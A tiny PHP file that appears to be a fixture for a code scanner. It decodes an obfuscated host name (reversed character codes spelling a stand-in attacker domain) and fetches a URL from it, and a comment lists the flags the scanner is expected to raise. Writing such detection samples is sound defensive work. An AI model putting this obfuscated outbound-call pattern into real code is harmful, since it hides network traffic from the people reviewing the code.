<?php
// @expect: FILE_READ, NETWORK, OBFUSCATION
$h = implode('', array_reverse(array_map('chr', [101, 108, 112, 109, 97, 120, 101, 46, 108, 105, 118, 101])));
file_get_contents('https://' . $h . '/x');
